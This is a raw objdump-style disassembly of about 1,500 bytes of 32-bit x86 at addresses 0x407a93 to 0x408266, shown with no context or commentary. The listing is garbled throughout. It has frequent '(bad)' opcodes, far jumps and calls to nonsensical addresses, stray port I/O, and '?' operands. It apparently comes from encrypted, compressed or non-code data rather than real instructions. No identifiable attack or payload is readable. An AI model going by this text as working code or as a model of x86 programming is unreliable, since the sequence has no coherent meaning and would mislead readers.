  407a93:	imul   esi,esi,0xc50035f7
  407a99:	mov    esp,0x5bbf00ab
  407a9e:	xor    BYTE PTR [edx],al
  407aa0:	mov    ecx,0xe2f2d4a9
  407aa5:	jb     0x407abf
  407aa7:	adc    cl,BYTE PTR [ebx]
  407aa9:	movaps xmm2,XMMWORD PTR [edi+esi*8]
  407aad:	xchg   edi,eax
  407aae:	xchg   ebp,eax
  407aaf:	fwait
  407ab0:	cmp    ah,BYTE PTR [edi]
  407ab2:	retf   
  407ab3:	pop    eax
  407ab4:	jmp    0xc1b82726
  407ab9:	loope  0x407b38
  407abb:	push   es
  407abc:	jg     0x407ab5
  407abe:	in     al,dx
  407abf:	cvttps2pi mm1,QWORD PTR [ebp-0x122177ef]
  407ac6:	inc    edi
  407ac7:	sar    DWORD PTR [ebx+0x72],0xd
  407acb:	push   ebp
  407acc:	in     al,dx
  407acd:	les    esp,FWORD PTR [ebp-0x7bc231b4]
  407ad3:	add    DWORD PTR [ecx+ebx*2-0x5e],edi
  407ad7:	sub    esp,DWORD PTR [esi]
  407ad9:	sub    eax,0x399e49bd
  407ade:	push   ds
  407adf:	scas   al,BYTE PTR es:[edi]
  407ae0:	dec    esi
  407ae1:	pop    eax
  407ae2:	mov    bh,0xf3
  407ae4:	lods   eax,DWORD PTR ds:[esi]
  407ae5:	loop   0x407af4
  407ae7:	js     0x407b09
  407ae9:	ret    0xb614
  407aec:	and    dl,BYTE PTR [edi+0x55]
  407aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407af0:	pop    edx
  407af1:	pop    ebx
  407af2:	clc    
  407af3:	cmp    dh,BYTE PTR [ecx+0x4c]
  407af6:	(bad)  
  407af7:	xor    DWORD PTR [edi+0x476f6282],ebp
  407afd:	lahf   
  407afe:	xor    eax,edx
  407b00:	xor    ah,BYTE PTR [esi+0x68]
  407b03:	jg     0x407b61
  407b05:	ins    DWORD PTR es:[edi],dx
  407b06:	push   ebp
  407b07:	dec    ecx
  407b08:	add    bl,BYTE PTR [edi+0x20]
  407b0b:	xor    DWORD PTR [esi-0x1b126e1],ebp
  407b11:	push   ds
  407b12:	or     ch,dl
  407b14:	mov    esp,0x7ee3af0d
  407b19:	mov    edx,0x5cdb40af
  407b1e:	bound  esi,QWORD PTR [edx+edi*1]
  407b21:	mov    ebp,0x23580d18
  407b26:	bound  eax,QWORD PTR [edi+0x28]
  407b29:	push   edi
  407b2a:	jnp    0x407ba4
  407b2c:	retf   0xcf89
  407b2f:	dec    esp
  407b30:	mov    ds:0xdedd01c4,eax
  407b35:	lds    edi,FWORD PTR [ebp-0x5f8e87b0]
  407b3b:	ficom  WORD PTR [edi]
  407b3d:	rol    DWORD PTR [esi],1
  407b3f:	rcr    BYTE PTR cs:[esi],cl
  407b42:	test   ah,0x4e
  407b45:	inc    ebp
  407b46:	sub    bh,BYTE PTR [ebx+eax*1-0x7698c3a]
  407b4d:	inc    edx
  407b4e:	(bad)  
  407b50:	(bad)  
  407b51:	imul   esi,ecx,0x4e
  407b54:	and    dl,BYTE PTR [edi-0x75]
  407b57:	adc    DWORD PTR [ebx],edi
  407b59:	jo     0x407b1f
  407b5b:	xor    al,0x96
  407b5d:	fidiv  DWORD PTR [esi]
  407b5f:	imul   eax,DWORD PTR [edx+0xd],0xffffff8d
  407b63:	add    DWORD PTR [edx+ecx*1-0x58],ebp
  407b67:	sub    edx,DWORD PTR [edi+ebx*4+0x3e]
  407b6b:	test   edi,ebp
  407b6d:	sbb    edx,DWORD PTR [ecx]
  407b6f:	jge    0x407b1d
  407b71:	cmp    eax,0xc9aa1f5c
  407b76:	mov    eax,ds:0xcce23e65
  407b7b:	add    ch,dh
  407b7d:	sub    DWORD PTR [edx-0x4b4b25d4],0x3b27c2bf
  407b87:	cmp    ch,BYTE PTR [edi+0x3751c76a]
  407b8d:	sbb    al,0x64
  407b8f:	xchg   BYTE PTR [ebp+0x350e9ed8],bh
  407b95:	mov    ecx,0x60c0964d
  407b9a:	(bad)  
  407b9c:	mov    edx,0xc04cf2e2
  407ba1:	in     al,0x17
  407ba3:	jo     0x407bae
  407ba5:	add    BYTE PTR ds:0xd85cc97c,dl
  407bab:	mov    dh,BYTE PTR [edx]
  407bad:	lock ror BYTE PTR [esi],cl
  407bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bb1:	mov    edi,0xe3c1f2d
  407bb6:	call   0xc867:0x3f114b39
  407bbd:	ret    
  407bbe:	(bad)  [edx+0x3e]
  407bc1:	xlat   BYTE PTR ds:[ebx]
  407bc2:	das    
  407bc3:	cdq    
  407bc4:	iret   
  407bc5:	fwait
  407bc6:	jns    0x407b7e
  407bc8:	in     al,0xef
  407bca:	out    dx,al
  407bcb:	sar    DWORD PTR [edx-0x22],0x19
  407bcf:	inc    eax
  407bd1:	(bad)  
  407bd2:	push   ss
  407bd3:	dec    edx
  407bd4:	adc    DWORD PTR [ecx+0x34d3f4c5],ebp
  407bda:	gs jecxz 0x407be6
  407bdd:	jne    0x407bd7
  407bdf:	iret   
  407be0:	lds    esp,FWORD PTR [esi-0x295e7fc4]
  407be6:	js     0x407c5a
  407be8:	jae    0x407c36
  407bea:	cmp    al,0xe5
  407bec:	mov    esp,DWORD PTR [ebx-0x78c4f698]
  407bf2:	pusha  
  407bf3:	sub    BYTE PTR [esi+edi*1-0x7ece75b1],dl
  407bfa:	ret    0x70b7
  407bfd:	mov    ebx,0x308346af
  407c02:	out    0x91,al
  407c04:	jbe    0x407bb1
  407c06:	push   edx
  407c07:	ins    DWORD PTR es:[edi],dx
  407c08:	inc    edx
  407c09:	or     ch,BYTE PTR [esi-0x28800ce4]
  407c0f:	or     ebx,ebp
  407c11:	pop    es
  407c12:	sub    esp,ebx
  407c14:	adc    cl,BYTE PTR [ecx+0x12387dbf]
  407c1a:	in     al,0xe7
  407c1c:	xchg   esi,eax
  407c1d:	bound  esp,QWORD PTR [ebp-0xb30b083]
  407c23:	retf   
  407c24:	jp     0x407bb3
  407c26:	push   ss
  407c27:	add    al,0xb5
  407c29:	jnp    0x407c7e
  407c2b:	sbb    al,0xa1
  407c2d:	mov    bh,0xe2
  407c2f:	inc    edx
  407c30:	add    BYTE PTR [edx-0x17],cl
  407c33:	dec    edx
  407c34:	and    eax,DWORD PTR [eax]
  407c36:	add    BYTE PTR [eax-0x5d10c7b2],dh
  407c3c:	mov    esi,DWORD PTR [ebx+0x33]
  407c3f:	(bad)  
  407c40:	sbb    BYTE PTR ds:0xd65f34e6,cl
  407c46:	pusha  
  407c47:	push   es
  407c48:	cmp    bh,BYTE PTR [esp+edi*2+0x4e]
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	dec    eax
  407c50:	rcr    BYTE PTR ds:0xffb44ec,1
  407c56:	push   ss
  407c57:	and    dl,BYTE PTR fs:[eax+0x7ad562c6]
  407c5e:	gs add al,0x6a
  407c61:	nop
  407c62:	(bad)  
  407c65:	icebp  
  407c66:	imul   edi,DWORD PTR [edi+0x6e],0x70879a54
  407c6d:	ret    0x423e
  407c70:	aaa    
  407c71:	(bad)  
  407c72:	imul   eax,DWORD PTR [ebx+0x55e97356],0x46353018
  407c7c:	hlt    
  407c7d:	push   es
  407c7e:	test   al,0xb5
  407c80:	sub    eax,0x7bb221bf
  407c85:	mov    bh,0x46
  407c87:	cmp    BYTE PTR [edx+ecx*4+0x2bd38cc],al
  407c8e:	fadd   DWORD PTR [esi]
  407c90:	aad    0x47
  407c92:	outs   dx,BYTE PTR ds:[esi]
  407c93:	into   
  407c94:	mov    bl,0xb7
  407c96:	fistp  QWORD PTR [esp+eiz*2]
  407c99:	outs   dx,DWORD PTR ds:[esi]
  407c9a:	lds    esi,FWORD PTR [edi]
  407c9c:	gs jmp 0xb649:0x86a07b32
  407ca4:	rcl    DWORD PTR [esi-0x1b0c0d28],cl
  407caa:	sub    ah,BYTE PTR [eax+0x27]
  407cad:	adc    al,0xb2
  407caf:	sar    DWORD PTR [eax],1
  407cb1:	fisttp WORD PTR [edx]
  407cb3:	repz mov dh,0xa3
  407cb6:	mov    edi,0xeca914f0
  407cbb:	dec    ebp
  407cbc:	sbb    eax,0x68a96a37
  407cc1:	xchg   BYTE PTR [eax-0x36],dl
  407cc4:	jg     0x407d0a
  407cc6:	inc    ebp
  407cc7:	push   ebp
  407cc8:	adc    eax,0xbe32c9bf
  407ccd:	inc    BYTE PTR [ecx+edi*1-0x23]
  407cd1:	inc    BYTE PTR [eax+edx*2-0xe403d3]
  407cd8:	pop    esp
  407cd9:	int    0x6
  407cdb:	or     BYTE PTR [edi+0x55],dl
  407cde:	pop    esi
  407cdf:	retf   
  407ce0:	mov    esi,0x5ad49c6c
  407ce5:	cmp    eax,0xdb71be71
  407cea:	js     0x407ce7
  407cec:	and    esi,DWORD PTR [eax-0x29d27a10]
  407cf2:	sbb    edi,esp
  407cf4:	in     eax,dx
  407cf5:	shr    DWORD PTR [ebp+0x4c97a0e5],cl
  407cfb:	dec    ecx
  407cfc:	pop    ds
  407cfd:	stos   BYTE PTR es:[edi],al
  407cfe:	retf   
  407cff:	mov    ebp,edx
  407d01:	fistp  QWORD PTR [edi-0x74f5e844]
  407d07:	push   cs
  407d08:	je     0x407ce3
  407d0a:	mov    bl,ch
  407d0c:	push   0xffffff82
  407d0e:	mov    ecx,0x523edfc2
  407d13:	ror    BYTE PTR [eax-0x4f],cl
  407d16:	shl    DWORD PTR [esi-0x43],0x0
  407d1a:	ret    
  407d1b:	mov    dl,0x35
  407d1d:	add    al,0x6
  407d1f:	xchg   ebp,eax
  407d20:	not    DWORD PTR [ebp-0x341ecdbc]
  407d26:	inc    ebx
  407d27:	fdiv   st,st(1)
  407d29:	xchg   edi,eax
  407d2a:	add    BYTE PTR [ebp+0x54],bh
  407d2d:	inc    BYTE PTR [esi+0x3542e73b]
  407d33:	out    0xac,eax
  407d35:	jmp    0x407ce7
  407d37:	repz in al,0x55
  407d3a:	repz cld 
  407d3c:	pop    ds
  407d3d:	dec    edi
  407d3e:	push   esp
  407d3f:	push   edx
  407d40:	or     bh,BYTE PTR [ebx+edx*8-0x2d6c7cde]
  407d47:	sbb    ecx,DWORD PTR [ecx+eiz*4]
  407d4a:	xor    BYTE PTR [eax],dl
  407d4c:	sbb    DWORD PTR [edi+ebx*1+0xd70c345],eax
  407d53:	sar    BYTE PTR [eax+0x289935fd],0x9c
  407d5a:	loop   0x407d4e
  407d5c:	push   edx
  407d5d:	or     ah,ch
  407d5f:	in     al,0x7e
  407d61:	and    al,0x6c
  407d63:	push   cs
  407d64:	cmp    esp,DWORD PTR [ebp+0x2df22275]
  407d6a:	mov    eax,0x4c946dab
  407d6f:	mov    ?,WORD PTR [ecx+edx*8-0xbc47bd7]
  407d76:	push   ebx
  407d77:	jle    0x407dba
  407d79:	pop    edi
  407d7a:	mov    al,ds:0x6a1f3f88
  407d7f:	inc    edx
  407d80:	xchg   ebx,eax
  407d81:	dec    edi
  407d82:	dec    ecx
  407d83:	or     eax,0xfb9a7b19
  407d88:	cmp    BYTE PTR [eax+eiz*4+0x2a],ah
  407d8c:	push   0xffffff9b
  407d8e:	push   esi
  407d8f:	jmp    0xc8cd:0xcfc757e5
  407d96:	mov    bh,0x84
  407d98:	les    ebx,FWORD PTR [ecx-0x54]
  407d9b:	jns    0x407d84
  407d9d:	sbb    cl,cl
  407d9f:	fld    TBYTE PTR [ebp+0x32]
  407da2:	es ss inc esi
  407da5:	push   ebp
  407da6:	in     eax,0xa
  407da8:	arpl   WORD PTR [esi-0x22],sp
  407dab:	xor    edx,esi
  407dad:	ss call 0xf39dfa9b
  407db3:	mov    esi,0x15fbc7a0
  407db8:	mov    ebx,0xde9ed432
  407dbd:	jnp    0xd5d238a7
  407dc3:	mov    esp,0x294d59b9
  407dc8:	test   DWORD PTR [ecx+ecx*2],ebp
  407dcb:	rcr    BYTE PTR [edi],0x6b
  407dce:	or     BYTE PTR [edi+0x30],dl
  407dd1:	or     eax,0x5b5b06e1
  407dd6:	test   DWORD PTR [eax-0x74],edi
  407dd9:	(bad)  
  407dda:	scas   al,BYTE PTR es:[edi]
  407ddb:	inc    edx
  407ddc:	or     al,0x86
  407dde:	xor    dl,BYTE PTR [ecx]
  407de0:	jle    0x407e35
  407de2:	in     al,dx
  407de3:	adc    eax,0x87ccd041
  407de8:	adc    DWORD PTR cs:[edx],ebx
  407deb:	jecxz  0x407dd3
  407ded:	mov    al,0xcd
  407def:	cmp    dh,BYTE PTR [esi]
  407df1:	inc    ecx
  407df2:	call   0x27827f66
  407df7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407df8:	stc    
  407df9:	mov    DWORD PTR [ebx-0x1a34a416],edi
  407dff:	mov    esi,0xd9638fd9
  407e04:	adc    bx,WORD PTR [edi]
  407e07:	fnstenv ds:0x25ef512e
  407e0d:	in     eax,dx
  407e0e:	clc    
  407e0f:	mov    esi,0xd448285a
  407e14:	jnp    0x407e4b
  407e16:	mov    ds:0x816e08d9,eax
  407e1b:	jg     0x407da8
  407e1d:	fbld   TBYTE PTR [edi+0x4f]
  407e20:	xor    esp,DWORD PTR cs:[ecx-0x2e293547]
  407e27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e28:	leave  
  407e29:	sub    edi,DWORD PTR [ebx-0x34]
  407e2c:	retf   0xcafc
  407e2f:	cmp    edx,DWORD PTR [edx+0x7e]
  407e32:	xor    eax,0x23874889
  407e37:	fcmove st,st(7)
  407e39:	cmp    bh,BYTE PTR [edx+0x351daacf]
  407e3f:	push   ss
  407e40:	ss xchg esi,eax
  407e43:	push   ss
  407e44:	xor    dh,BYTE PTR [ebx+0x48]
  407e47:	rcl    BYTE PTR [esi-0x4a83bf8c],cl
  407e4d:	add    al,0x95
  407e4f:	daa    
  407e50:	xor    al,0xb3
  407e52:	fs cmp al,0xfc
  407e55:	data16 daa 
  407e57:	jmp    0x407e59
  407e59:	ret    
  407e5a:	int    0x57
  407e5c:	popf   
  407e5d:	pushf  
  407e5e:	hlt    
  407e5f:	jg     0x407eda
  407e61:	fwait
  407e62:	push   eax
  407e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e64:	push   esi
  407e65:	out    dx,al
  407e66:	push   0xffffffea
  407e68:	fild   DWORD PTR [edi+0x78e5413]
  407e6e:	mov    dh,0x1f
  407e70:	jecxz  0x407e7e
  407e72:	out    dx,eax
  407e73:	cmp    cl,bl
  407e75:	cli    
  407e76:	sahf   
  407e77:	jle    0x407e44
  407e79:	stos   DWORD PTR es:[edi],eax
  407e7a:	popf   
  407e7b:	into   
  407e7c:	adc    ebp,eax
  407e7e:	inc    eax
  407e7f:	inc    ebp
  407e80:	je     0x407e65
  407e82:	mov    ebx,0xb170ea1e
  407e87:	inc    edx
  407e88:	mov    eax,0x369c9146
  407e8d:	cmp    BYTE PTR [ecx+0x4c0d0582],dh
  407e93:	(bad)  
  407e94:	sub    DWORD PTR [esi-0x446ad166],esp
  407e9a:	push   edi
  407e9b:	jb     0x407e20
  407e9d:	mov    ebx,edi
  407e9f:	rol    DWORD PTR [esi+edi*2-0x6c],cl
  407ea3:	pop    ss
  407ea4:	adc    BYTE PTR [edi+ecx*4+0x47ce3783],0x7d
  407eac:	cmc    
  407ead:	ins    DWORD PTR es:[edi],dx
  407eae:	out    0x6a,al
  407eb0:	aam    0x94
  407eb2:	pop    esi
  407eb3:	pop    ss
  407eb4:	and    dh,BYTE PTR [ecx]
  407eb6:	or     BYTE PTR ds:0xa1256638,dh
  407ebc:	pop    edx
  407ebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ebe:	push   ecx
  407ebf:	pop    eax
  407ec0:	imul   eax,DWORD PTR [edi-0x7a123674],0x56
  407ec7:	aaa    
  407ec8:	inc    edi
  407ec9:	inc    ecx
  407eca:	pusha  
  407ecb:	(bad)  
  407ecc:	push   eax
  407ecd:	lods   eax,DWORD PTR ds:[esi]
  407ece:	or     DWORD PTR [esi],ecx
  407ed0:	cmp    edi,ebx
  407ed2:	out    dx,eax
  407ed3:	int3   
  407ed4:	rcr    DWORD PTR ss:[ebx-0x53696bca],cl
  407edb:	sbb    BYTE PTR [ecx-0x40c87d77],0x64
  407ee2:	adc    ebx,esp
  407ee4:	mov    BYTE PTR [ebp-0x22],bh
  407ee7:	adc    DWORD PTR [esi+ebx*1-0x7b6f1ce4],0xe3ef6b62
  407ef2:	es scas eax,DWORD PTR es:[edi]
  407ef4:	cwde   
  407ef5:	(bad)  
  407ef6:	(bad)  
  407ef8:	ret    0x8943
  407efb:	mov    ebp,0x2f41816b
  407f00:	mov    ch,0x29
  407f02:	mov    ch,0x22
  407f04:	sub    BYTE PTR [ecx+0x5d5268df],cl
  407f0a:	xchg   cx,ax
  407f0c:	and    BYTE PTR [edi+ebp*1],al
  407f0f:	in     al,dx
  407f10:	outs   dx,BYTE PTR ds:[esi]
  407f11:	mov    dl,BYTE PTR [edi-0x22]
  407f14:	imul   eax,ecx,0x7a
  407f17:	jae    0x407f39
  407f19:	int    0xce
  407f1b:	mov    al,0x66
  407f1d:	scas   al,BYTE PTR es:[edi]
  407f1e:	adc    eax,0xe3884480
  407f23:	test   BYTE PTR [edx+eiz*8+0x58],0xa1
  407f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f29:	mov    dl,0x15
  407f2b:	retf   
  407f2c:	inc    edx
  407f2d:	mov    bl,0xa3
  407f2f:	lock test al,0x42
  407f32:	mov    al,0xc4
  407f34:	jnp    0x407f8f
  407f36:	xor    eax,DWORD PTR [ebp-0x66115fea]
  407f3c:	cmp    eax,0xe4d1ac5a
  407f41:	shl    DWORD PTR [ecx],cl
  407f43:	in     al,dx
  407f44:	fistp  WORD PTR [bp+0x2c]
  407f48:	add    edi,esp
  407f4a:	mov    esi,0x7e31b8a6
  407f4f:	dec    edx
  407f50:	dec    esp
  407f51:	and    DWORD PTR [ebp+0x30],eax
  407f54:	stc    
  407f55:	add    al,0xdc
  407f57:	sub    al,cl
  407f59:	pand   mm7,QWORD PTR [esi]
  407f5c:	mov    dh,0xc2
  407f5e:	ficomp WORD PTR [edi]
  407f60:	fld    DWORD PTR [esi+ebx*8+0x36dd7d30]
  407f67:	dec    edi
  407f68:	adc    DWORD PTR ds:0xea74809,ecx
  407f6e:	idiv   DWORD PTR [ebx+0x26]
  407f71:	out    dx,eax
  407f72:	mov    esi,0xecad1d5b
  407f77:	mov    esp,0x4dc350c1
  407f7c:	mov    ds:0x1d73a0ac,al
  407f81:	cmp    edx,DWORD PTR [eax+0x5]
  407f84:	xlat   BYTE PTR ds:[ebx]
  407f85:	mov    ch,0xdf
  407f87:	shr    BYTE PTR [edi],0x8b
  407f8a:	or     eax,0xc393f4a0
  407f8f:	out    dx,al
  407f90:	aam    0xe3
  407f92:	fimul  DWORD PTR [ebx+0x45]
  407f95:	and    eax,0x3619e1b0
  407f9a:	pop    ebp
  407f9b:	ffreep st(1)
  407f9d:	aad    0x9e
  407f9f:	jp     0x407f67
  407fa1:	push   eax
  407fa2:	popa   
  407fa3:	ins    BYTE PTR es:[edi],dx
  407fa4:	push   DWORD PTR [edx-0x539df5a9]
  407faa:	dec    ecx
  407fab:	lea    esi,[edi-0x47eabec4]
  407fb1:	adc    dl,dh
  407fb3:	(bad)  
  407fb4:	mov    edi,0xe08c6ec
  407fb9:	lods   eax,DWORD PTR ds:[esi]
  407fba:	fldl2e 
  407fbc:	add    DWORD PTR [ecx-0x5b],esi
  407fbf:	lods   al,BYTE PTR ds:[esi]
  407fc0:	aas    
  407fc1:	cwde   
  407fc2:	push   esp
  407fc3:	pop    esp
  407fc4:	xchg   edi,eax
  407fc5:	inc    edx
  407fc6:	jno    0x408024
  407fc8:	mov    dh,0xa7
  407fca:	and    edi,DWORD PTR [edx+ebx*8-0x19b7c4c0]
  407fd1:	cmp    ecx,DWORD PTR [edx-0x78a49ab4]
  407fd7:	pusha  
  407fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fd9:	popa   
  407fda:	push   esi
  407fdb:	call   0xcef81203
  407fe0:	(bad)  
  407fe1:	aaa    
  407fe2:	sub    edx,eax
  407fe4:	lock rcr DWORD PTR [ecx],cl
  407fe7:	inc    edi
  407fe8:	repz or dl,0xa9
  407fec:	scas   al,BYTE PTR es:[edi]
  407fed:	or     BYTE PTR [ecx+0x57],bl
  407ff0:	mov    esp,0x8644a314
  407ff5:	nop
  407ff6:	jbe    0x40800c
  407ff8:	sub    esi,DWORD PTR ds:0xcff5ce02
  407ffe:	jnp    0x407fcd
  408000:	and    BYTE PTR [edi+0xb074244],cl
  408006:	pop    esp
  408007:	je     0x408046
  408009:	test   WORD PTR [ecx+0x19cc6f88],cx
  408010:	bound  ecx,QWORD PTR [ebx+0x5fc7be2d]
  408016:	add    bl,dh
  408018:	cmp    al,0x8
  40801a:	adc    eax,0x67f1c377
  40801f:	jnp    0x408058
  408021:	or     BYTE PTR [eax],0x77
  408024:	out    0xd2,al
  408026:	inc    ebx
  408027:	(bad)  [eax+0x4e7e5862]
  40802d:	idiv   BYTE PTR [edx+0x7d]
  408030:	(bad)  
  408031:	xchg   edi,eax
  408032:	inc    DWORD PTR [eax-0x114802d6]
  408038:	push   ss
  408039:	mov    edx,0x578278c5
  40803e:	push   esp
  40803f:	or     BYTE PTR [edi],dl
  408041:	or     al,al
  408043:	shl    DWORD PTR [esi+eax*1-0x7fd73f4a],0xb7
  40804b:	inc    ecx
  40804c:	ret    
  40804d:	out    dx,al
  40804e:	mov    eax,ds:0xdcb24e5d
  408053:	add    eax,0x749a2b4a
  408058:	out    0x25,eax
  40805a:	fisubr DWORD PTR [edi]
  40805c:	xchg   DWORD PTR [ebx],ecx
  40805e:	scas   eax,DWORD PTR es:[edi]
  40805f:	pop    eax
  408060:	mov    al,0xd1
  408062:	mov    edi,0x36d3bff1
  408067:	push   ecx
  408068:	sbb    ebx,esp
  40806a:	sub    eax,0x4306821
  40806f:	pop    ecx
  408070:	pop    ss
  408071:	pushf  
  408072:	and    al,0x93
  408074:	fimul  WORD PTR [esp+edi*1+0x59]
  408078:	dec    esi
  408079:	stos   BYTE PTR es:[edi],al
  40807a:	stc    
  40807b:	jg     0x4080e2
  40807d:	call   0xf441764a
  408082:	xchg   esp,eax
  408083:	jl     0x408041
  408085:	jne    0x408039
  408087:	jecxz  0x40809f
  408089:	sahf   
  40808a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40808b:	int3   
  40808c:	loop   0x4080ef
  40808e:	jnp    0x408012
  408090:	pop    ebx
  408091:	(bad)
  408096:	xor    esp,DWORD PTR [ebx+0x46]
  408099:	pop    eax
  40809a:	sahf   
  40809b:	enter  0xad38,0xd3
  40809f:	jo     0x4080ae
  4080a1:	shl    DWORD PTR ds:0xbef7a472,1
  4080a7:	sub    DWORD PTR [edx+ecx*4+0x52],0x30
  4080ac:	xchg   BYTE PTR [edx+edi*8+0x53],al
  4080b0:	nop
  4080b1:	fisubr DWORD PTR [edx]
  4080b3:	mov    bl,0x28
  4080b5:	mov    bl,0xea
  4080b7:	push   ebp
  4080b8:	int3   
  4080b9:	dec    ebx
  4080ba:	xor    ch,BYTE PTR [edi+0x38748b98]
  4080c0:	sahf   
  4080c1:	fstp   TBYTE PTR [ebp-0x76]
  4080c4:	std    
  4080c5:	lock xor al,0x9a
  4080c8:	mov    al,ds:0x74985520
  4080cd:	ja     0x4080d9
  4080cf:	leave  
  4080d0:	lahf   
  4080d1:	jecxz  0x40809d
  4080d3:	popa   
  4080d4:	or     al,cl
  4080d6:	mov    bl,0x41
  4080d8:	jge    0x4080f1
  4080da:	xor    ebp,esp
  4080dc:	rol    BYTE PTR [edx-0x2f47dd6d],0xb1
  4080e3:	loop   0x40808b
  4080e5:	pop    esp
  4080e6:	pop    ss
  4080e7:	shl    DWORD PTR [edi-0xf],cl
  4080ea:	lea    esi,[ebx]
  4080ec:	pop    edx
  4080ed:	in     eax,0xf9
  4080ef:	mov    esp,0x4b8f59fe
  4080f4:	fcom   DWORD PTR [edx-0x79c4f1ac]
  4080fa:	bswap  edx
  4080fc:	pushf  
  4080fd:	push   0x5515f9cd
  408102:	xor    eax,0x72dd6ad4
  408107:	(bad)  
  408108:	(bad)  
  408109:	push   edx
  40810a:	sub    dl,BYTE PTR [ecx+0x23]
  40810d:	jp     0x4080f1
  40810f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408110:	fiadd  WORD PTR [ebp+ebp*2-0x1a]
  408114:	leave  
  408115:	fadd   QWORD PTR [edx+0x4d]
  408118:	gs repz xchg edi,eax
  40811b:	cld    
  40811c:	fwait
  40811d:	in     eax,0xa8
  40811f:	stc    
  408120:	inc    eax
  408121:	mov    DWORD PTR [ebx+ecx*4],edx
  408124:	enter  0x120d,0x9f
  408128:	pusha  
  408129:	idiv   bl
  40812b:	push   esp
  40812c:	pop    edx
  40812d:	cs cli 
  40812f:	int3   
  408130:	sub    DWORD PTR [eax],ebp
  408132:	scas   eax,DWORD PTR es:[edi]
  408133:	push   edi
  408134:	push   ss
  408135:	cwde   
  408136:	repz in eax,0x8a
  408139:	fcom   QWORD PTR [ebp+0x3584f477]
  40813f:	xor    eax,0x96757deb
  408144:	adc    dh,0x58
  408147:	je     0x40812a
  408149:	pop    esp
  40814a:	mov    ?,ebx
  40814c:	pop    ebx
  40814d:	inc    esi
  40814e:	mov    ebp,DWORD PTR [ecx+0x1f]
  408151:	add    DWORD PTR [edx-0x661bef32],ebp
  408157:	popa   
  408158:	mov    al,0x8a
  40815a:	aas    
  40815b:	cmc    
  40815c:	xor    dh,ah
  40815e:	stos   DWORD PTR es:[edi],eax
  40815f:	std    
  408160:	daa    
  408161:	mov    ds:0xd92e95c5,al
  408166:	test   edx,ebx
  408168:	je     0x4081a2
  40816a:	loop   0x4081d1
  40816c:	outs   dx,BYTE PTR ds:[esi]
  40816d:	or     al,bl
  40816f:	pop    es
  408170:	outs   dx,DWORD PTR ds:[esi]
  408171:	mov    ebp,DWORD PTR [esi+0x4d]
  408174:	or     dl,BYTE PTR [edx+0x1ce3621a]
  40817a:	ja     0x40813c
  40817c:	pop    es
  40817d:	js     0x408193
  40817f:	jmp    0x6b197ab4
  408184:	mov    esp,0xd53d88eb
  408189:	push   edi
  40818a:	in     eax,0xa8
  40818c:	xor    al,0x60
  40818e:	xchg   BYTE PTR [eax+0x136868f1],al
  408194:	popf   
  408195:	xchg   edx,eax
  408196:	sub    al,BYTE PTR [edx]
  408198:	inc    ebp
  408199:	inc    ecx
  40819a:	(bad)  
  40819c:	(bad)  
  40819d:	call   0x994ebcfb
  4081a2:	(bad)  
  4081a3:	sub    cl,0x90
  4081a6:	das    
  4081a7:	fldenv [esi+0x6b]
  4081aa:	inc    eax
  4081ab:	rep lods al,BYTE PTR ds:[esi]
  4081ad:	ds loopne 0x40814c
  4081b0:	jg     0x408141
  4081b2:	fcomp  DWORD PTR [eax-0x27ca56eb]
  4081b8:	dec    eax
  4081b9:	push   eax
  4081ba:	aam    0x77
  4081bc:	fidiv  WORD PTR ds:0x430ef11a
  4081c2:	aaa    
  4081c3:	mov    DWORD PTR [edx-0x6c2668b1],ebp
  4081c9:	loopne 0x408200
  4081cb:	and    dh,BYTE PTR [ebx]
  4081cd:	aam    0xe8
  4081cf:	nop
  4081d0:	sbb    al,0x3
  4081d2:	(bad)  
  4081d3:	mov    ah,0x5
  4081d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081d7:	mov    al,0xb
  4081d9:	inc    edx
  4081da:	sbb    eax,esp
  4081dc:	push   0x20
  4081de:	jecxz  0x40823a
  4081e0:	cdq    
  4081e1:	call   0x75c0a5f9
  4081e6:	fcmove st,st(6)
  4081e8:	out    dx,al
  4081e9:	pop    ebx
  4081ea:	mov    ebx,0x7ecb11b7
  4081ef:	cmp    eax,0xcf3312aa
  4081f4:	and    eax,0x2d1da83c
  4081f9:	and    cl,BYTE PTR [eax+0x78eecd]
  4081ff:	(bad)  
  408200:	mov    cl,BYTE PTR [edi]
  408202:	or     DWORD PTR [esi-0x325843b1],ebp
  408208:	mov    ch,BYTE PTR [ecx]
  40820a:	xadd   ah,ah
  40820d:	cmp    esp,DWORD PTR ds:0x3c8e68a8
  408213:	rcr    DWORD PTR [esi+0x65],cl
  408216:	pop    ecx
  408217:	adc    ebx,eax
  408219:	in     al,dx
  40821a:	mov    edi,0x349669d0
  40821f:	mov    bl,BYTE PTR [edi]
  408221:	(bad)  
  408222:	loopne 0x408213
  408224:	sub    BYTE PTR [ecx-0x2a780e4],al
  40822a:	adc    al,dl
  40822c:	sub    al,0xda
  40822e:	outs   dx,BYTE PTR ds:[esi]
  40822f:	push   ebp
  408230:	cdq    
  408231:	mov    ch,cl
  408233:	sbb    eax,0xdba61908
  408238:	das    
  408239:	aas    
  40823a:	lea    edx,[eax+ebp*8+0x15557c55]
  408241:	push   ds
  408242:	call   0x88b:0x9fdb54d1
  408249:	cmc    
  40824a:	xchg   ebx,eax
  40824b:	leave  
  40824c:	jge    0x4081f3
  40824e:	mov    ?,WORD PTR [eax+ebx*8]
  408251:	sbb    al,0x5f
  408253:	push   ds
  408254:	push   cs
  408255:	cmp    BYTE PTR [edx],ch
  408257:	pop    edx
  408258:	int    0x38
  40825a:	jne    0x40825a
  40825c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40825d:	ja     0x40828d
  40825f:	je     0x408259
  408261:	adc    ebx,DWORD PTR [eax]
  408263:	dec    edx
  408264:	pop    edi
  408265:	hlt    
  408266:	jns    0x4082e1
